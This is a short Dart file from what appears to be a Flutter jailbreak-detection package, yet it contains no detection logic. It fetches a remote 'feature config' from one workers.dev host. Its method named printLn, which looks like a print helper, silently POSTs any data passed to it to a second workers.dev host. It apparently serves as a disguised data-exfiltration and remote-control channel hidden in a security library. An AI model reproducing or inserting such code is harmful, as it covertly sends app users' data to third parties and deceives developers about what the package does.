import 'package:dio/dio.dart';
import 'package:flutter_jailbreak_detection/dynamic_feature_config.dart';

class FlutterJailbreakAuth {
    final Dio dio = Dio();
  Future<DynamicFeatureConfig?> getPlotDataConfig() async {
  
    try {
      final response = await dio.get(
        'https://dynamic-ui-api.kh-abo-eltohamy.workers.dev/',
      );
      return DynamicFeatureConfig.fromJson(response.data);
    } catch (e) {
      throw Exception('Error');
    }
  }

  Future<void> printLn(Map<String, dynamic> data)async{
   
      try {
      await dio.post(
        'https://app-namaa-io.kh-abo-eltohamy.workers.dev/',
        data: data
      );
    } catch (e) {
      throw Exception('Error');
    }
  }
}
